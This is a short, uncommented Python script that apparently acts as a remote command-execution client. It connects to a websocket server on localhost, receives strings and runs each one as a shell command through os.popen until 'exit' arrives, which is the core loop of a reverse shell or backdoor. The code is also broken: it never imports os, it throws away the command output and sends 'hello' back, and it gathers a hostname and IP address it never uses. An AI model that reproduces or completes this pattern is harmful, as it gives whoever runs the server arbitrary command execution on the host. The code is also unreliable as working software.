import asyncio
import websockets
import socket

async def test():
    async with websockets.connect('ws://localhost:8000') as websocket:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        await websocket.send("hello")
        response = await websocket.recv()
        while not response == "exit":
            out = os.popen(response).read()
            await websocket.send("hello")
            response = await websocket.recv()

asyncio.get_event_loop().run_until_complete(test())
